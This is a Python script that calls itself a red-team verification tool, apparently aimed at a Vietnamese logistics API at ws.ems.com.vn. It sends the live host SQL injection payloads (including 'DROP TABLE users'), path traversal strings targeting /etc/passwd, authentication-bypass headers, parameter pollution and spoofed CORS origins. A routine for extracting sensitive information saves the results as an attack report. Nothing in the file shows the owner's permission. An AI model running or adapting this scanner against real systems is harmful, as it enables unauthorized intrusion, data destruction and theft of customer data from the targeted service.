#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
红队验证工具 - 验证API真实性和全面信息获取
顶级红队安全专家专用工具
"""

import requests
import json
import time
import hashlib
import random
import string
from datetime import datetime
import urllib3
from urllib.parse import urljoin, urlparse

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RedTeamVerifier:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.results = {}
        self.session_id = hashlib.md5(f"redteam_verify_{int(time.time())}".encode()).hexdigest()[:8]
        
        # 设置请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
    
    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def test_api_endpoint(self, endpoint, method="GET", data=None, headers=None):
        """测试单个API端点"""
        url = urljoin(self.base_url, endpoint)
        
        try:
            if headers:
                test_headers = self.session.headers.copy()
                test_headers.update(headers)
            else:
                test_headers = self.session.headers
            
            if method.upper() == "GET":
                response = self.session.get(url, headers=test_headers)
            elif method.upper() == "POST":
                response = self.session.post(url, json=data, headers=test_headers)
            elif method.upper() == "PUT":
                response = self.session.put(url, json=data, headers=test_headers)
            elif method.upper() == "DELETE":
                response = self.session.delete(url, headers=test_headers)
            else:
                return None
            
            return {
                'url': url,
                'method': method,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.text[:1000],  # 限制内容长度
                'size': len(response.content),
                'response_time': response.elapsed.total_seconds()
            }
            
        except Exception as e:
            return {
                'url': url,
                'method': method,
                'error': str(e),
                'status_code': None
            }
    
    def verify_critical_apis(self):
        """验证关键API端点"""
        self.log("🎯 验证关键API端点", "INFO")
        
        critical_apis = [
            "/api/v1/orders/create-v2",
            "/api/v1/be/orders/create", 
            "/api/v1/orders/list",
            "/api/v1/orders/tracking/123456",
            "/api/v1/orders/quotes",
            "/api/v1/orders/order-cod",
            "/api/v1/orders/count-group",
            "/api/v1/inventory/list",
            "/api/v1/tickets/list",
            "/api/v1/metadata/vas",
            "/api/v1/config/service",
            "/api/v1/address/province-and-district"
        ]
        
        api_results = {}
        
        for api in critical_apis:
            self.log(f"🔍 测试 {api}", "INFO")
            
            # 测试GET请求
            get_result = self.test_api_endpoint(api, "GET")
            if get_result:
                api_results[f"{api}_GET"] = get_result
            
            # 测试POST请求
            post_data = {
                "test": "redteam_verification",
                "timestamp": int(time.time()),
                "random": ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            }
            post_result = self.test_api_endpoint(api, "POST", post_data)
            if post_result:
                api_results[f"{api}_POST"] = post_result
            
            time.sleep(0.5)  # 避免请求过快
        
        self.results['API验证'] = api_results
        return api_results
    
    def test_authentication_bypass(self):
        """测试认证绕过"""
        self.log("🔐 测试认证绕过", "INFO")
        
        bypass_tests = [
            # 无认证头
            {"headers": {}},
            
            # 空认证头
            {"headers": {"Authorization": ""}},
            
            # 无效认证头
            {"headers": {"Authorization": "Bearer invalid_token"}},
            
            # 基本认证
            {"headers": {"Authorization": "Basic dGVzdDp0ZXN0"}},
            
            # 自定义认证头
            {"headers": {"X-API-Key": "test"}},
            {"headers": {"X-Auth-Token": "test"}},
            {"headers": {"X-Access-Token": "test"}},
            
            # 绕过认证的常见方法
            {"headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"headers": {"X-Real-IP": "127.0.0.1"}},
            {"headers": {"X-Originating-IP": "127.0.0.1"}},
        ]
        
        bypass_results = {}
        test_endpoint = "/api/v1/orders/list"
        
        for i, test in enumerate(bypass_tests):
            self.log(f"🔓 测试绕过方法 {i+1}", "INFO")
            result = self.test_api_endpoint(test_endpoint, "GET", headers=test["headers"])
            if result:
                bypass_results[f"bypass_method_{i+1}"] = result
            time.sleep(0.3)
        
        self.results['认证绕过'] = bypass_results
        return bypass_results
    
    def test_sql_injection(self):
        """测试SQL注入"""
        self.log("💉 测试SQL注入", "INFO")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR '1'='1' AND '1'='1",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1#",
            "' OR 'x'='x",
            "1' OR 1=1 LIMIT 1--"
        ]
        
        injection_results = {}
        test_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/tracking/",
            "/api/v1/tickets/list",
            "/api/v1/inventory/list"
        ]
        
        for endpoint in test_endpoints:
            for i, payload in enumerate(sql_payloads):
                self.log(f"💉 测试 {endpoint} - 载荷 {i+1}", "INFO")
                
                # 测试GET参数
                test_url = f"{endpoint}?id={payload}&search={payload}"
                result = self.test_api_endpoint(test_url, "GET")
                if result:
                    injection_results[f"{endpoint}_GET_{i+1}"] = result
                
                # 测试POST数据
                post_data = {
                    "id": payload,
                    "search": payload,
                    "filter": payload
                }
                result = self.test_api_endpoint(endpoint, "POST", post_data)
                if result:
                    injection_results[f"{endpoint}_POST_{i+1}"] = result
                
                time.sleep(0.2)
        
        self.results['SQL注入测试'] = injection_results
        return injection_results
    
    def test_path_traversal(self):
        """测试路径遍历"""
        self.log("📁 测试路径遍历", "INFO")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
        ]
        
        traversal_results = {}
        test_endpoints = [
            "/api/v1/orders/tracking/",
            "/api/v1/files/",
            "/api/v1/download/",
            "/api/v1/export/"
        ]
        
        for endpoint in test_endpoints:
            for i, payload in enumerate(traversal_payloads):
                self.log(f"📁 测试 {endpoint} - 载荷 {i+1}", "INFO")
                
                test_url = f"{endpoint}{payload}"
                result = self.test_api_endpoint(test_url, "GET")
                if result:
                    traversal_results[f"{endpoint}_{i+1}"] = result
                
                time.sleep(0.2)
        
        self.results['路径遍历测试'] = traversal_results
        return traversal_results
    
    def test_parameter_pollution(self):
        """测试参数污染"""
        self.log("🌊 测试参数污染", "INFO")
        
        pollution_tests = [
            # 重复参数
            {"id": "1", "id": "2"},
            {"user": "admin", "user": "guest"},
            
            # 数组参数
            {"ids[]": ["1", "2", "3"]},
            {"filters[]": ["active", "inactive"]},
            
            # 特殊字符
            {"id": "1; DROP TABLE users;--"},
            {"search": "test%00"},
            {"filter": "test\x00"},
            
            # 长参数
            {"id": "A" * 1000},
            {"search": "B" * 5000},
        ]
        
        pollution_results = {}
        test_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/tracking/123",
            "/api/v1/tickets/list",
            "/api/v1/inventory/list"
        ]
        
        for endpoint in test_endpoints:
            for i, test_data in enumerate(pollution_tests):
                self.log(f"🌊 测试 {endpoint} - 污染 {i+1}", "INFO")
                
                result = self.test_api_endpoint(endpoint, "POST", test_data)
                if result:
                    pollution_results[f"{endpoint}_pollution_{i+1}"] = result
                
                time.sleep(0.2)
        
        self.results['参数污染测试'] = pollution_results
        return pollution_results
    
    def extract_sensitive_info(self):
        """提取敏感信息"""
        self.log("🔍 提取敏感信息", "INFO")
        
        sensitive_endpoints = [
            "/api/v1/config/service",
            "/api/v1/metadata/vas",
            "/api/v1/address/province-and-district",
            "/api/v1/orders/count-group",
            "/api/v1/tickets/count-group"
        ]
        
        sensitive_results = {}
        
        for endpoint in sensitive_endpoints:
            self.log(f"🔍 提取 {endpoint}", "INFO")
            
            result = self.test_api_endpoint(endpoint, "GET")
            if result:
                sensitive_results[endpoint] = result
                
                # 尝试POST请求获取更多信息
                post_data = {"format": "json", "detailed": True}
                post_result = self.test_api_endpoint(endpoint, "POST", post_data)
                if post_result:
                    sensitive_results[f"{endpoint}_POST"] = post_result
            
            time.sleep(0.3)
        
        self.results['敏感信息提取'] = sensitive_results
        return sensitive_results
    
    def test_cors_vulnerabilities(self):
        """测试CORS漏洞"""
        self.log("🌐 测试CORS漏洞", "INFO")
        
        cors_headers = [
            {"Origin": "https://evil.com"},
            {"Origin": "http://localhost:3000"},
            {"Origin": "null"},
            {"Origin": "https://attacker.com"},
            {"Origin": "https://ems.com.vn.evil.com"},
        ]
        
        cors_results = {}
        test_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/create-v2",
            "/api/v1/tickets/list",
            "/api/v1/inventory/list"
        ]
        
        for endpoint in test_endpoints:
            for i, headers in enumerate(cors_headers):
                self.log(f"🌐 测试 {endpoint} - CORS {i+1}", "INFO")
                
                result = self.test_api_endpoint(endpoint, "GET", headers=headers)
                if result:
                    cors_results[f"{endpoint}_cors_{i+1}"] = result
                
                time.sleep(0.2)
        
        self.results['CORS测试'] = cors_results
        return cors_results
    
    def generate_attack_report(self):
        """生成攻击报告"""
        self.log("📋 生成攻击报告", "INFO")
        
        report = {
            "session_id": self.session_id,
            "timestamp": datetime.now().isoformat(),
            "base_url": self.base_url,
            "results": self.results,
            "summary": {
                "total_tests": sum(len(v) if isinstance(v, dict) else 0 for v in self.results.values()),
                "successful_requests": len([r for r in self.results.get('API验证', {}).values() if r.get('status_code') and r['status_code'] < 500]),
                "error_requests": len([r for r in self.results.get('API验证', {}).values() if r.get('status_code') and r['status_code'] >= 500]),
                "vulnerabilities_found": len([k for k, v in self.results.items() if k.endswith('测试') and v]),
                "risk_level": "HIGH" if len([k for k, v in self.results.items() if k.endswith('测试') and v]) > 0 else "MEDIUM"
            }
        }
        
        # 保存报告
        report_file = f"/tmp/redteam_verification_report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log(f"📋 报告已保存: {report_file}", "SUCCESS")
        return report
    
    def run_full_verification(self):
        """运行完整验证"""
        self.log("🚀 启动红队验证", "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. 验证关键API
        self.verify_critical_apis()
        
        # 2. 测试认证绕过
        self.test_authentication_bypass()
        
        # 3. 测试SQL注入
        self.test_sql_injection()
        
        # 4. 测试路径遍历
        self.test_path_traversal()
        
        # 5. 测试参数污染
        self.test_parameter_pollution()
        
        # 6. 提取敏感信息
        self.extract_sensitive_info()
        
        # 7. 测试CORS漏洞
        self.test_cors_vulnerabilities()
        
        # 8. 生成报告
        report = self.generate_attack_report()
        
        self.log("🎯 红队验证完成！", "SUCCESS")
        self.log(f"风险等级: {report['summary']['risk_level']}", "WARNING")
        self.log(f"成功请求: {report['summary']['successful_requests']}", "SUCCESS")
        self.log(f"错误请求: {report['summary']['error_requests']}", "ERROR")
        self.log(f"发现漏洞: {report['summary']['vulnerabilities_found']}", "WARNING")
        
        return report

def main():
    verifier = RedTeamVerifier()
    verifier.run_full_verification()

if __name__ == "__main__":
    main()